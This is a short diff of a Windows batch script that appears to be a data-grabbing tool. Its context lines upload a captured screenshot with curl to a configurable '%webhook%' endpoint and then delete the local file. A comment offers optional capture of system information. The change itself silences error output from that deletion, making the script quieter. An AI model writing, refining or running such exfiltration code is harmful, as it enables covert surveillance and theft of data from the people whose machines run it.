@@ -56,7 +56,7 @@ goto skipscreenshot
 	
 	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
 	
-	del "%vpath%\s.png"
+	2>NUL del "%vpath%\s.png"
 :skipscreenshot
 
 :: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
